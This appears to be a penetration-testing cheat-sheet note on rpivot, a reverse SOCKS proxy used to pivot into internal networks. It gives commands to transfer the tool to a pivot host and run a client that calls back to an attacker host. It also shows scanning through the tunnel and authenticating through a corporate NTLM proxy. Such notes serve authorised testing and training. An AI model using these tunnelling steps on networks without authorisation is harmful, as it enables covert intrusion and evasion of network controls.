# rpivot — Reverse SOCKS Proxy

Useful when the internal host can't be reached directly but can initiate outbound connections to your attack host. Client runs on the pivot, server runs on your attack host — opposite direction from most tools.

Clone and transfer to pivot:

```bash
git clone https://github.com/klsecservices/rpivot.git
scp -r rpivot <USER>@<PIVOT_IP>:/home/<USER>/
```

Start the SOCKS server on your attack host — listens for client callbacks on 9999, exposes SOCKS on 9050:

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Run the client on the pivot — calls back to your attack host:

```bash
python2 client.py --server-ip <ATTACK_HOST_IP> --server-port 9999
```

Confirm connection shows `New connection from host <PIVOT_IP>` on the server side. Then use proxychains as normal — SOCKS listener is at `127.0.0.1:9050`.

Browse or scan through the tunnel:

```bash
proxychains firefox-esr <TARGET_IP>:80
proxychains nmap -Pn -sT <TARGET_IP>
```

---

## NTLM Proxy Authentication

When the pivot is behind a corporate HTTP proxy requiring NTLM auth — rpivot handles it natively:

```bash
python2 client.py --server-ip <ATTACK_HOST_IP> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port 8081 --domain <DOMAIN> --username <USER> --password <PASS>
```

> [!tip] rpivot requires Python2 on both ends — verify before transferring. If only Python3 is available, use Chisel instead for similar reverse proxy functionality.